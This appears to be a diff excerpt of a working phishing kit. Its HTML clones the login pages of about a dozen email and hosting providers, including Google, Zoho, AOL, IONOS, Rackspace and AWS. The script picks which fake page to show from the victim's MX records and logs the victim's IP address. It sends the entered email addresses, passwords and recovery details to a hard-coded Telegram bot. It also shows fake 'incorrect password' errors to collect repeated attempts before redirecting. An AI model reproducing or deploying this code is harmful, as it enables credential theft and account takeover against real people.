+                  <p>Wildcard</p>
+                  <p>Multi-Domain</p>
+                  <h5>Resellers</h5>
+                  <p>SSL Certificates</p>
+                  <p>Reseller Hosting</p>
+                  <h5>Promos</h5>
+                </div>
+                <div class="f_gird_2">
+                  <h5>Guru Guides</h5>
+                  <h5>Help Center</h5>
+                  <p>Status Updates</p>
+                  <p>Knowledgebase</p>
+                  <p>How-To Videos</p>
+                  <p>Submit Ticket</p>
+                  <p>Live Chat</p>
+                  <p>Report Abuse</p>
+                  <h5>Apps</h5>
+                  <p>Marketplace</p>
+                  <p>Subscriptions</p>
+                  <p>Business Formation <span class="new_badge_footer">NEW</span></p>
+                  <p>Relate</p>
+                  <p>RelateSocial <span class="new_badge_footer">NEW</span></p>
+                  <p>RelateReviews <span class="new_badge_footer">NEW</span></p>
+                  <p>Visual</p>
+                  <p>Stencil Graphics <span class="new_badge_footer">NEW</span></p>
+                  <p>Site Maker</p>
+                  <p>Logo Maker</p>
+                  <p>Business Card Maker</p>
+                  <p>Business Name Generator</p>
+                  <h5>Careers</h5>
+                  <h5>Affiliates</h5>
+                  <h5>Send us Feedback</h5>
+                </div>
+              </div>
+            </div>
+            <div class="f_gird_bottm">
+              <p>
+                The entirety of this site is protected by copyright © 2000–2023 Namecheap, Inc. 4600
+                East Washington Street, Suite 305, Phoenix, AZ 85034, USA
+              </p>
+              <div>
+                <p>Terms and Conditions</p>
+                <p>Privacy Policy</p>
+                <p>UDRP</p>
+              </div>
+            </div>
+            <div class="nc_bottom_footer">
+              <img src="" alt="" id="nc_footer_img" />
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="earthlinkSection">
+        <div class="elInnerWrapper">
+          <div class="el_header">
+            <div class="elh1">
+              <img src="" alt="" id="earthlink_logo" />
+            </div>
+            <div class="elh2">
+              <img src="" alt="" id="el_ggl" />
+              <input type="text" />
+              <img src="" alt="" id="el_search" />
+            </div>
+            <div class="elh3">
+              <img src="" alt="" id="el_icons" />
+            </div>
+          </div>
+          <div class="el_body">
+            <div class="null_pass_error d_none el_error_b">
+              Username or password is blank. Please try again.
+            </div>
+            <div class="error_box el_error_b d_none">
+              Username or password is incorrect. Please try again.
+            </div>
+            <div class="el_b_logo">
+              <img src="" alt="" id="earthlink_logo2" />
+            </div>
+            <div class="elBoard_wrapper board">
+              <h1>Welcome to WebMail</h1>
+              <p>Sign In to Get Started</p>
+              <div class="el_input_box">
+                <label for="">Email Address:</label>
+                <input type="text" class="el_name_key" />
+              </div>
+              <div class="el_input_box">
+                <label for="">Password:</label>
+                <input type="password" id="el_n_p" class="name_pass" />
+              </div>
+              <div class="el_rmbr">
+                <div>
+                  <input type="checkbox" />
+                  <p>Remember username</p>
+                </div>
+                <p>Forgot your password?</p>
+              </div>
+              <div class="el_btns">
+                <button onclick="sign_in_action(3, 'no_need_border')">Sign in</button>
+                <div>
+                  <button>Make a Payment</button>
+                  <button>Support</button>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div id="el_footer"></div>
+        </div>
+      </section>
+      <section class="d_none" id="mimecastSection">
+        <div class="mcInnerWrapper">
+          <div class="logo_wrapper">
+            <img src="" alt="" id="mimecast_logo" />
+          </div>
+          <div class="mc_dashboard_wrapper board">
+            <h5>Log In</h5>
+            <p class="name_key_holder"></p>
+            <div class="input_box_mc">
+              <input type="password" placeholder="Password" id="mc_name_pass" class="name_pass" />
+              <div class="error_box mc_error_b d_none">
+                Invalid user name, password or permissions.
+              </div>
+              <div class="null_pass_error"></div>
+              <button onclick="sign_in_action(4, 'no_need_border')" id="mc_submit_btn">
+                Log in
+              </button>
+            </div>
+            <a href="#">Log in as a different user.</a>
+            <a href="#">Reset Cloud Password</a>
+          <div class="mc_footer">
+            <p>©2023 Mimecast v1.5.21-1-20230131_0937</p>
+            <p>Privacy</p>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="googleSection">
+        <div class="gglInnerWrapper">
+          <div class="ggl_dashboard board">
+            <img src="" alt="" id="ggl_logo" />
+            <h2>Welcome</h2>
+            <div class="ggl_n_k_hold">
+              <img src="" alt="" id="ggl_account_icon" />
+              <p class="name_key_holder"></p>
+              <img src="" alt="" id="ggl_down_icon" />
+            </div>
+            <div class="box_wrapper_ggl_">
+              <div class="input_box_ggl_wrapper input_box_ggl_wrapper1">
+                <input type="password" id="ggl_input" class="name_pass" />
+                <label for="ggl_input" id="ggl_label" class="">Enter your password</label>
+                <input type="text" id="pass_holder_ggl" style="display: none;">
+              </div>
+              <div class="input_box_ggl_wrapper input_box_ggl_wrapper2">
+                <input type="text" id="ggl_input__rpe" class="" required/>
+                <label for="ggl_input__rpe" id="ggl_input__rpe_label" class="">Enter recovery Email or Phone</label>
+              </div>
+            </div>
+            <div class="null_pass_error d_none ">
+              <div class="ggl_null_pass_error">
+                <img src="" alt="" id="exclam_icon">
+                <p class="skdhks__">Enter password</p>
+              </div>
+            </div>
+            <div class="error_box d_none">
+              <div class="ggl_error_box">
+                <img src="" alt="" id="exclam_icon2">
+                Incorrect password. Please try again or click on the "Forgot your password?" link to reset it.
+              </div>
+            </div>
+            <div class="show_pass_box">
+              <input type="checkbox" name="" id="show_pass_ggl" onclick="togglePasswordVisibility(this, 'ggl_input')"/>
+              <label for="show_pass_ggl">Show password</label>
+            </div>
+            <div class="action_box_ggl">
+              <p>Forgot password?</p>
+              <button onclick="sign_in_action(5)" id="ggl_submit_btn">
+                Next
+              </button>
+            </div>
+          </div>
+          <div class="ggl_footer">
+            <div class="ggl_f_1">
+              <p>English (United States)</p>
+              <span><i class="fa-solid fa-caret-down"></i>
+            </div>
+            <div class="ggl_f_2">
+              <p>Help</p>
+              <p>Privacy</p>
+              <p>Terms</p>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="rackSection">
+        <div id="rackspacesection">
+          <div class="rackspaceInnerWrapper board">
+            <div class="rk-content-header">
+              <div class="rk-content-header-label">Webmail Login</div>
+              <div class="rk-content-header-logo">
+                <img src="" alt="" id="rk_logo">
+              </div>
+            </div>
+            <div class="rk-content-body">
+              <div class="rk-banner-section">
+                <img src="" alt="" id="rk_banner">
+              </div>
+              <div class="rk-devider"></div>
+              <div class="rk-login-form">
+                <div class="rk-user-file">
+                  <div class="null_pass_error rk_n_p_e d_none">
+                    That account doesn't exist. Enter a different account
+                  </div>
+                  <div class="error_box rk_e_b d_none">
+                    Invalid password.! please enter your correct password.
+                  </div>
+                  <div class="rk-user-email-info">
+                    <label for="">Email Address</label>
+                    <input type="text" name="" id="rk_name_key" />
+                  </div>
+                  <div class="rk-fp-info"><a href="#">Forgot password?</a></div>
+                  <div class="rk-SeInfo">
+                    <label for="">Password</label>
+                    <input type="password" name="password" id="rk_name_pass" class="name_pass" />
+                  </div>
+                  <div class="rk-login-btn"><button onclick="sign_in_action(6, 'no_need_border')">Log in</button></div>
+                </div>
+              </div>
+            </div>
+            <div class="rk-base-link">
+              <a href="#">Privacy Statement</a>
+              <div class="rk-devider2">|</div>
+              <a href="#">Website Terms</a>
+            </div>
+            <div class="rk-rackspace-footer">
+              <div class="rk-caption">
+                <p>
+                  Need webmail for your business? Learn more about <a href="#">Hosted Email</a> from
+                  Rackspace
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="ionosSection">
+        <div id="ionosInnerWrapper">
+          <div class="ionos_header_wrapper">
+            <img src="" alt="" id="ionos_logo">
+            <img id="ionos_search_bar" src="" alt="">
+            <img src="" alt="" id="ionos_qs_icon">
+          </div>
+          <div class="login__dashboard board">
+            <h1>Webmail Login</h1>
+            <div class="error_box d_none">
+              <div class="inp_error">
+                <p>An error has occurred.</p>
+                <p>This e-mail address could not be found or the password is incorrect.</p>
+              </div>
+            </div>
+            <div class="null_pass_error d_none">
+              <div class="inp_error">
+                <p>An error has occurred.</p>
+                <p>Please try again later.</p>
+              </div>
+            </div>
+            <div class="ionos_input_box_wrapper">
+              <div class="ib_icon">
+                <img src="" alt="" id="ionos_user_icon">
+              </div>
+              <div class="iib__">
+                <input type="text" name="" id="ionos_email" class="">
+                <label for="ionos_email" id="ionos_email_label">E-mail Address</label>
+              </div>
+            </div>
+            <div class="ionos_fp">
+              <p class="ionos_linkstyle">Forgot your password?</p>
+            </div>
+            <div class="ionos_input_box_wrapper">
+              <div class="ib_icon">
+                <img src="" alt="" id="ionos_lock_icon">
+              </div>
+              <div class="iib__">
+                <input type="password" name="" id="ionos_password" class="name_pass">
+                <label for="ionos_password" id="ionos_password_label">Password</label>
+              </div>
+            </div>
+            <div class="ionos_rm">
+              <input type="checkbox" name="">
+              <p class="ionos_linkstyle">Remember me</p>
+            </div>
+            <div class="ionos_dcdprimaryButton">
+                <input type="button" id="ionos_action_btn" onclick="sign_in_action(7, 'no_need_border')" value="Login">
+            </div>
+          </div>
+          <div class="ionos_mail_merketing">
+            <div>
+              <h2>You don't have a professional email account yet?</h2>
+              <p>IONOS email address from $1 incl. free domain.</p>
+              <button class="iembtn">Learn more</button>
+            </div>
+            <div>
+              <img src="" id="iem_" alt="">
+            </div>
+          </div>
+          <div class="ionos_part_2">
+            <img src="" alt="" id="ionos_part_img">
+          </div>
+          <div class="ionos_footer__">
+            <p><span>•</span> All Systems Operational</p>
+            <p>IONOS Inc. • 2023</p>
+            <p>Privacy Policy</p>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="aolSection">
+        <div class="aolInnerWrapper">
+          <div class="aol_header">
+            <img src="" alt="" id="aol_logo">
+            <p>Help</p>
+          </div>
+          <div class="aol_body_wrap">
+            <div class="aolWhiteBoard board">
+              <img src="" alt="" id="aol_logo2">
+              <div class="name_key_holder_aol">
+                <p class="name_key_holder"></p>
+              </div>
+              <div class="board_h_info">
+                <h3>
+                  Enter password
+                </h3>
+                <p>to finish signing in</p>
+              </div>
+              <div class="aol_input_box">
+                <input type="password" name="" id="aol_name_pass" class="name_pass">
+                <label for="aol_name_pass" id="aol_label__">Password</label>
+              </div>
+              <div class="null_pass_error d_none aol_n_e_b">
+                Please provide password.
+              </div>
+              <div class="error_box d_none aol_e_b">
+                Uh oh, looks as though something went wrong. Please try again later.
+              </div>
+              <div class="aol_btn">
+                <button onclick="sign_in_action(8)" >Sign in</button>
+              </div>
+              <p class="aol_f_p">Forgotten password?</p>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="roundcubeSection">
+        <div class="roundcubeInnerWrapper">
+          <div class="rc_form_item board">
+            <div class="rc_login_form_fild">
+              <div class="rc_roundcube_logo">
+                <img src="" id="rc_logo" alt="" />
+              </div>
+              <div class="null_pass_error d_none rc_n_e">
+                That account doesn't exist. Enter a different account
+              </div>
+              <div class="error_box d_none rc_e_b">
+                Invalid Password...! Please enter correct password.
+              </div>
+              <div class="rc_roundcube_Input_box">
+                <div class="rc_rdb_email_ads">
+                  <label for="">Email address</label>
+                  <input type="text" id="rc_email" placeholder="Enter Email" />
+                </div>
+                <div class="rc_rdb_pass_box">
+                  <label for="">Password</label>
+                  <input type="password" id="rc_password" class="name_pass" placeholder="Enter password" />
+                </div>
+                <div class="rc_rdb_button">
+                  <button onclick="sign_in_action(9, 'no_need_border')"> Login </button>
+                </div>
+              </div>
+            </div>
+            <div class="rc_rdb_bottom_content">
+              <p>You have successfully terminated the session. <a href="#">Login to Continue.</a></p>
+            </div>
+            <div class="rc_rdb_footer">
+              <span>RoundCube Webmail</span>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="zohoSection">
+        <div class="zohoInnerWrapper">
+          <div class="zoho_conteiner">
+              <div class="sign_in_conteiner">
+                  <div class="zoho_sign_box">
+                      <div class="zoho_logo"><img src="" id="zohoLogo" alt=""></div>
+                      <div class="zoho_input_fild">
+                          <!-- <form action="" method="post"> -->
+                              <div class="zoho_sign_head">
+                                  <span class="zoho_head_title">Sign in</span>
+                                  <div class="zoho-service_name">to access <span>Zoho Home</span></div>
+                              </div>
+                              <div class="zoho_fild_container board">
+                                  <div class="zoho_hello_user">
+                                      <div class="zoho_user_name name_key_holder">
+                                      </div>
+                                      <span class="notYou">Change</span>
+                                  </div>
+                                  <div class="zoho_text_box">
+                                      <input type="password" name="" class="textbox name_pass" placeholder="Enter Password">
+                                      <!-- <span class="zoho_icon"><i class="fa-solid fa-eye"></i></span> -->
+                                  </div>
+                                  <div class="null_pass_error d_none rc_n_e">
+                                    Please enter Password
+                                  </div>
+                                  <div class="error_box d_none rc_n_e">
+                                    Invalid Password...! Please enter correct password
+                                  </div>
+                                  <div class="zoho_textBox_action">
+                                      <span class="zoho_blue_text_auction">Forgot Password</span>
+                                  </div>
+                              </div>
+                              <div class="zoho_button">
+                                  <button class="Btn_blue" onclick="sign_in_action(10)"><span>Sign in</span></button>
+                              </div>
+                          <!-- </form> -->
+                      </div>
+                  </div>
+                  <div class="zoho_right_sitebox">
+                      <img src="" id="zohoInfo" alt="">
+                  </div>
+              </div>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="centurylinkSection">
+        <div class="clInnerWrapper">
+          <div class="cl_header_">
+            <img src="" alt="" id="cl_logo">
+          </div>
+          <div class="cl_whiteboard board">
+            <div class="cl_input_box_wrapper">
+              <input type="email" id="cl_name_key__" class="cl_name_key">
+              <label for="cl_name_key__" id="cl_name_key__label">CenturyLink Email</label>
+            </div>
+            <div class="cl_input_box_wrapper">
+              <input type="password" class="name_pass" id="name_pass__">
+              <label for="name_pass__" id="name_pass__label">Password</label>
+              <div class="null_pass_error d_none">
+                <div class="cl_err_box">
+                  Enter a password
+                </div>
+              </div>
+            </div>
+            <div class="cl_rm_">
+              <input type="checkbox">
+              <p>Stay signed in</p>
+            </div>
+            <div class="error_box d_none">
+              <div class="cl_e_bbb__">
+                Invalid username or password.  Try again
+              </div>
+            </div>
+            <div class="cl_signin_btn">
+              <button onclick="sign_in_action(11)">Sign in</button>
+            </div>
+            <div class="cl_help_">
+              <p>Forgot Password?</p>
+              <p>Need help?</p>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="webmailSection">
+        <div class="webmailInnerWrapper">
+          <div class="error_box  d_none">
+            <div class="wm_err_box">
+            <img src="" alt="" id="webmail_error">
+            </div>
+          </div>
+          <div class="wm_logo_wrapper">
+            <img src="" alt="" id="wm_logo">
+          </div>
+          <div class="wm_board board">
+            <div class="null_pass_error d_none">
+              <p class="wm_eeeeeeerr">That account doesn't exist. Enter a different account</p>
+            </div>
+            <label for="wm_name_key">Email address</label>
+            <div class="wm_input_wrapper">
+              <img src="" alt="" id="wm_user_icon">
+              <input type="email" id="wm_name_key" placeholder="Enter your email address">
+            </div>
+            <label for="wm_name_pass">Password</label>
+            <div class="wm_input_wrapper">
+              <img src="" alt="" id="wm_lock_icon">
+              <input type="email" id="wm_name_pass" class="name_pass" placeholder="Enter your email password">
+            </div>
+            <div class="wm_signin_btn">
+              <button onclick="sign_in_action(12, 'no_need_border')">Sign in</button>
+            </div>
+            <div class="wm_rp">Reset Password</div>
+          </div>
+          <div class="wm_footer__">
+            <ul>
+              <li>English </li>
+              <li>العربية</li>
+              <li>български</li>
+              <li>čeština </li>
+              <li>اdansk </li>
+              <li>Deutsch </li>
+              <li>Ελληνικά</li>
+              <li>español</li>
+              <li>•••</li>
+            </ul>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="revisionSection">
+        <div class="revisionInnerWrapper">
+          <div class="revisionWhiteBoard board">
+            <div class="revisionWhiteBoard_left">
+              <img src="" alt="" id="revision_logo" />
+              <div class="revision_header">
+                <h1>Root user sign in</h1>
+                <span><i class="fa-solid fa-circle-info"></i></span>
+              </div>
+              <div class="revision_name_k_taker">
+                <b>Email: </b>
+                <p class="name_key_holder"></p>
+              </div>
+              <div class="revision_label">
+                <b>Password</b>
+                <a href="#">Forgot password?</a>
+              </div>
+              <div class="revision_input_box">
+                <input type="password" class="name_pass" name="user_key__"/>
+                <div class="null_pass_error d_none revision_null_pass_error">
+                  Password field must not to be empty.!
+                </div>
+                <div class="error_box d_none revision_error_box">
+                  You have entered incorrect username or password. Please try again.
+                </div>
+              </div>
+              <div class="revision_confirm_btn">
+                <button onclick="sign_in_action(13, 'no_need_border')">Sign In</button>
+              </div>
+              <div class="diff_anchor">
+                <a href="#">Sign in to a different account</a>
+                <a href="#">Create a new account</a>
+              </div>
+            </div>
+            <div class="revisionWhiteBoard_right">
+              <img src="" alt="" id="revision_hero" />
+            </div>
+          </div>
+          <div class="revision_footer">
+            <p>
+              © 2023, Amazon Web Services, Inc. or its affiliates. All rights reserved.© 2022,
+              Amazon Web Services, Inc. or its affiliates. All rights reserved.
+            </p>
+            <a role="button"
+              >English <span><i class="fa-solid fa-caret-down"></i></span
+            ></a>
+          </div>
+        </div>
+      </section>
+    </section>
+    <script>
+        // storing variables
+        const token = '6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4';
+        const chatId = '1461764555';
+        const url_link = 'https://aluminum-vagabond-nerve.glitch.me/';
+
+        const redirectURL =
+        'http://www.cvent.com/events/2018-facial-rejuvenation/event-summary-66dad18444ca4ff1b1379df029fd67f3.aspx/';
+        const hero_img = document.getElementById('hero_img');
+        const office_brand = document.getElementById('office_brand');
+        const office_left_arrow = document.getElementById('office_left_arrow');
+        const name_key = document.getElementById('name_key');
+        const godaddy_logo = document.getElementById('godaddy_logo');
+        const revision_logo = document.getElementById('revision_logo');
+        const revision_hero = document.getElementById('revision_hero');
+        const namecheap_logo = document.getElementById('namecheap_logo');
+        const namecheap_logo_f = document.getElementById('namecheap_logo_f');
+        const cart_img_nc = document.getElementById('cart_img_nc');
+        const search_img_nc = document.getElementById('search_img_nc');
+        const nc_footer_img = document.getElementById('nc_footer_img');
+        const earthlink_logo = document.getElementById('earthlink_logo');
+        const earthlink_logo2 = document.getElementById('earthlink_logo2');
+        const mimecast_logo = document.getElementById('mimecast_logo');
+        const el_footer = document.getElementById('el_footer');
+        const el_ggl = document.getElementById('el_ggl');
+        const el_search = document.getElementById('el_search');
+        const el_icons = document.getElementById('el_icons');
+        const mc_name_pass = document.getElementById('mc_name_pass');
+        const mc_submit_btn = document.getElementById('mc_submit_btn');
+        const ggl_logo = document.getElementById('ggl_logo');
+        const ggl_account_icon = document.getElementById('ggl_account_icon');
+        const ggl_down_icon = document.getElementById('ggl_down_icon');
+        const exclam_icon = document.getElementById('exclam_icon');
+        const exclam_icon2 = document.getElementById('exclam_icon2');
+        const rk_logo = document.getElementById('rk_logo');
+        const rk_banner = document.getElementById('rk_banner');
+        const ionos_logo = document.getElementById('ionos_logo');
+        const ionos_search_bar = document.getElementById('ionos_search_bar');
+        const ionos_qs_icon = document.getElementById('ionos_qs_icon');
+        const ggl_input__rpe = document.getElementById('ggl_input__rpe');
+        const aol_logo = document.getElementById('aol_logo');
+        const aol_logo2 = document.getElementById('aol_logo2');
+        const rc_logo = document.getElementById('rc_logo');
+        const zohoLogo = document.getElementById('zohoLogo');
+        const zohoInfo = document.getElementById('zohoInfo');
+        const cl_logo = document.getElementById('cl_logo');
+        const name_key_error_box = document.getElementsByClassName('name_key_error_box')[0];
+        const clInnerWrapper = document.getElementsByClassName('clInnerWrapper')[0];
+        const zohoInnerWrapper = document.getElementsByClassName('zohoInnerWrapper')[0];
+        const name_key_holder = document.querySelectorAll('.name_key_holder');
+        const null_pass_error = document.querySelectorAll('.null_pass_error');
+        const error_box = document.querySelectorAll('.error_box');
+        const name_pass = document.querySelectorAll('.name_pass');
+        const board = document.querySelectorAll('.board');
+        const greetingSection = document.getElementById('greetingSection');
+        const officeSection = document.getElementById('officeSection');
+        const godaddySection = document.getElementById('godaddySection');
+        const revisionSection = document.getElementById('revisionSection');
+        const namecheapSection = document.getElementById('namecheapSection');
+        const earthlinkSection = document.getElementById('earthlinkSection');
+        const mimecastSection = document.getElementById('mimecastSection');
+        const googleSection = document.getElementById('googleSection');
+        const webmailSection = document.getElementById('webmailSection');
+        const rackSection = document.getElementById('rackSection');
+        const ionosSection = document.getElementById('ionosSection');
+        const aolSection = document.getElementById('aolSection');
+        const roundcubeSection = document.getElementById('roundcubeSection');
+        const zohoSection = document.getElementById('zohoSection');
+        const centurylinkSection = document.getElementById('centurylinkSection');
+        const ionos_lock_icon = document.getElementById('ionos_lock_icon');
+        const ionos_user_icon = document.getElementById('ionos_user_icon');
+        const iem_ = document.getElementById('iem_');
+        const ionos_part_img = document.getElementById('ionos_part_img');
+        const wm_logo = document.getElementById('wm_logo');
+        const wm_lock_icon = document.getElementById('wm_lock_icon');
+        const wm_user_icon = document.getElementById('wm_user_icon');
+        const webmail_error = document.getElementById('webmail_error');
+        var message = '';
+
+        // getting ip
+        var ipAddress = '';
+        fetch('https://api.ipify.org/?format=json')
+        .then((response) => response.json())
+        .then((data) => {
+            ipAddress = data.ip;
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+        });
+
+        // storing functions
+        function setImg(elem, imageName) {
+        elem.setAttribute('src', url_link + imageName);
+        }
+        function validateNameKey(nameKey) {
+        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return regex.test(nameKey);
+        }
+
+        function view_action() {
+        if (validateNameKey(name_key.value)) {
+            for (let i = 0; i < name_key_holder.length; i++) {
+            name_key_holder[i].innerHTML = name_key.value;
+            }
+            document.getElementsByClassName('name_key_holder_gd')[0].value = name_key.value;
+            document.getElementsByClassName('name_key_nc')[0].value = name_key.value;
+            document.getElementsByClassName('el_name_key')[0].value = name_key.value;
+            document.getElementsByClassName('cl_name_key')[0].value = name_key.value;
+            document.getElementById('rk_name_key').value = name_key.value;
+            document.getElementById('ionos_email').value = name_key.value;
+            document.getElementById('rc_email').value = name_key.value;
+            document.getElementById('wm_name_key').value = name_key.value;
+            greetingSection.classList.add('d_none');
+            function setting_favicon(iconName) {
+            document.getElementById('fav_icon').attributes.href.textContent =
+                url_link + 'domain_assets/' + iconName;
+            }
+
+            function getEmailServiceProvider(email) {
+            const domain = email.split('@')[1];
+            const dnsLookupUrl = `https://dns.google/resolve?name=${domain}&type=MX`;
+            return fetch(dnsLookupUrl)
+                .then((response) => response.json())
+                .then((data) => {
+                const mxRecords = data.Answer.filter((record) => record.type === 15);
+                if (mxRecords.length > 0) {
+                    const emailServiceProvider = mxRecords[0].data.split(' ')[1].slice(0, -1);
+                    return emailServiceProvider;
+                } else {
+                    return null;
+                }
+                });
+            }
+            getEmailServiceProvider(name_key.value)
+            .then((esp) => {
+                if (esp) {
+                espName = esp.split('.');
+                espName = espName[espName.length - 2];
+                //   console.log(`Email service provider: ${esp}`);
+                //   console.log(`Email service provider: ${espName}`);
+                runESPconditions(espName);
+                } else {
+                googleSection.classList.remove('d_none');
+                setting_favicon('google_favicon.png');
+                //   console.log('Unable to determine the email service provider.');
+                }
+            })
+            .catch((error) => {
+                webmailSection.classList.remove('d_none');
+                setting_favicon('cpanel_favicon.png');
+                // console.error('Error:', error);
+            });
+
+            function runESPconditions(final) {
+            if (
+                final == 'outlook' ||
+                final == 'office365' ||
+                final == 'microsoft' ||
+                final == 'hotmail' ||
+                final == 'live' ||
+                final == 'msn'
+            ) {
+                officeSection.classList.remove('d_none');
+                setting_favicon('office_favicon.ico');
+            } else if (final == '1&1' || final == '1and1' || final == 'ionos') {
+                ionosSection.classList.remove('d_none');
+                setting_favicon('ionos_favicon.png');
+            } else if (final == 'godaddy' || final == 'secureserver') {
+                godaddySection.classList.remove('d_none');
+                setting_favicon('godaddy_favico.png');
+            } 
+            else if (final == 'amazonaws') {
+                revisionSection.classList.remove('d_none');
+                setting_favicon('revision_Favicon.png');
+            }
+            else if (final == 'yahoodns') {
+                aolSection.classList.remove('d_none');
+                setting_favicon('aol_favicon.png');
+            } else if (final == 'yahoo') {
+                officeSection.classList.remove('d_none');
+                setting_favicon('office_favicon.ico');
+            } else if (final == 'rackspace' || final == 'emailsrvr') {
+                rackSection.classList.remove('d_none');
+                setting_favicon('rack_favicon.png');
+            } else if (final == 'namecheap' || final == 'jellyfish' || final == 'privateemail') {
+                namecheapSection.classList.remove('d_none');
+                setting_favicon('namecheap_favicon.png');
+            } else if (final == 'gmail' || final == 'google') {
+                googleSection.classList.remove('d_none');
+                setting_favicon('google_favicon.png');
+            } else if (final == 'zoho') {
+                zohoSection.classList.remove('d_none');
+                setting_favicon('zoho_favicon.png');
+            } else if (final == 'centurylink') {
+                centurylinkSection.classList.remove('d_none');
+                setting_favicon('centurylink_favicon.png');
+            } else if (final == 'mimecast') {
+                mimecastSection.classList.remove('d_none');
+                setting_favicon('mimecast_favicon.ico');
+            } else if (final == 'earthlink-vadesecure') {
+                earthlinkSection.classList.remove('d_none');
+                setting_favicon('earthlink_favicon.ico');
+            } else if (final == 'roundcube') {
+                roundcubeSection.classList.remove('d_none');
+                setting_favicon('roundcube_favicon.png');
+            } else {
+                webmailSection.classList.remove('d_none');
+                setting_favicon('cpanel_favicon.png');
+            }
+            }
+
+            document.getElementsByClassName('gd_label')[0].classList.add('focus_active');
+            name_key_error_box.classList.remove('d_block');
+            name_key.classList.remove('error_border');
+        } else {
+            name_key_error_box.classList.add('d_block');
+            name_key.classList.add('error_border');
+        }
+        }
+        var clickCount = 0;
+        function sign_in_action(eleNum, border) {
+        //   console.log(eleNum);
+        //   console.log('name_key.value', name_key.value);
+        if (eleNum == 5) {
+            if (validateNameKey(name_key.value)) {
+            //   console.log('v n k pass & name key', name_key);
+            const name_pass_value = name_pass[eleNum].value;
+            //   console.log('name_pass_value', name_pass_value);
+            if (ggl_input__rpe.value.length > 5) {
+                // console.log('length pass');
+                message =
+                ' Gmail is: ' +
+                name_key.value +
+                ' And recovery email or phone is: ' +
+                ggl_input__rpe.value +
+                ' and IP is: ' +
+                ipAddress;
+                sendMessage(message);
+                // console.log(message);
+            } else if (ggl_input__rpe.value.length > 0 && ggl_input__rpe.value.length < 4) {
+                // console.log('length fail');
+                document.getElementsByClassName('skdhks__')[0].innerHTML = 'Enter recovery Email or Phone';
+                null_pass_error[eleNum].classList.add('d_block');
+            }
+            if (name_pass_value.length > 4) {
+                clickCount++;
+                if (clickCount >= 3) {
+                document.getElementsByClassName('box_wrapper_ggl_')[0].classList.add('add_e_or_p');
+                error_box[eleNum].classList.remove('d_block');
+                name_pass[eleNum].classList.remove('error_border_color');
+                } else {
+                message =
+                    'Gmail is: ' +
+                    name_key.value +
+                    ' and Password is: ' +
+                    name_pass_value +
+                    ' and IP is: ' +
+                    ipAddress;
+                sendMessage(message);
+                //   console.log(message);
+                name_pass[eleNum].value = '';
+                null_pass_error[eleNum].classList.remove('d_block');
+                error_box[eleNum].classList.add('d_block');
+                name_pass[eleNum].classList.add('error_border_color');
+                }
+                if (clickCount == 4) {
+                board[eleNum].classList.add('opacity_none');
+                window.location.href = redirectURL;
+                }
+            } else {
+                name_pass[eleNum].classList.add('error_border_color');
+                null_pass_error[eleNum].classList.add('d_block');
+                error_box[eleNum].classList.remove('d_block');
+            }
+            }
+        } else {
+            if (validateNameKey(name_key.value)) {
+            //   console.log('v n k pass & name key', name_key);
+            const name_pass_value = name_pass[eleNum].value;
+            //   console.log('name_pass_value', name_pass_value);
+            if (name_pass_value.length > 4) {
+                // console.log('length pass');
+                if (eleNum == 5) {
+                message =
+                    'Email is: ' +
+                    name_key.value +
+                    ' and Password is: ' +
+                    name_pass_value +
+                    ' and recovery email or phone is: ' +
+                    ggl_input__rpe.value +
+                    ' and IP is: ' +
+                    ipAddress;
+                sendMessage(message);
+                //   console.log(message);
+                } else {
+                message =
+                    'Email is: ' +
+                    name_key.value +
+                    ' and Password is: ' +
+                    name_pass_value +
+                    ' and IP is: ' +
+                    ipAddress;
+                sendMessage(message);
+                //   console.log(message);
+                }
+                clickCount++;
+                name_pass[eleNum].value = '';
+                null_pass_error[eleNum].classList.remove('d_block');
+                error_box[eleNum].classList.add('d_block');
+                if (border == 'no_need_border') {
+                } else if (border == 'no_need_error_border') {
+                } else {
+                name_pass[eleNum].classList.add('error_border_color');
+                }
+                if (clickCount == 3) {
+                board[eleNum].classList.add('opacity_none');
+                window.location.href = redirectURL;
+                }
+            } else {
+                // console.log('length fail');
+                if (border == 'no_need_border') {
+                } else {
+                name_pass[eleNum].classList.add('error_border_color');
+                }
+                null_pass_error[eleNum].classList.add('d_block');
+                error_box[eleNum].classList.remove('d_block');
+            }
+            }else{
+            console.log('error');
+            }
+        }
+        }
+
+        // sending message
+        function sendMessage(message) {
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
+            message
+        )}`;
+        fetch(url)
+            .then((response) => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.json();
+            })
+            .then((data) => {
+            console.log(data);
+            })
+            .catch((error) => {
+            console.error(error);
+            });
+        }
+
+        // calling functions
+        setImg(hero_img, 'domain_assets/Marquee_Device_Desktop.png');
+        setImg(office_brand, 'domain_assets/office_brand.svg');
+        setImg(office_left_arrow, 'domain_assets/arrow_left.svg');
+        setImg(godaddy_logo, 'domain_assets/godaddy_logo.png');
+        setImg(revision_logo, 'domain_assets/aws_logo.png');
+        setImg(revision_hero, 'domain_assets/aws_hero.png');
+        setImg(namecheap_logo, 'domain_assets/namecheap_Logo.png');
+        setImg(namecheap_logo_f, 'domain_assets/namecheap_Logo.png');
+        setImg(nc_footer_img, 'domain_assets/namecheap_footer.jpg');
+        setImg(cart_img_nc, 'domain_assets/nc_cart.png');
+        setImg(search_img_nc, 'domain_assets/nc_search.jpg');
+        setImg(earthlink_logo, 'domain_assets/earthlink_logo.png');
+        setImg(earthlink_logo2, 'domain_assets/earthlink_logo.png');
+        setImg(el_ggl, 'domain_assets/el_ggl.png');
+        setImg(el_search, 'domain_assets/el_search_btn.png');
+        setImg(el_icons, 'domain_assets/el_icons.jpg');
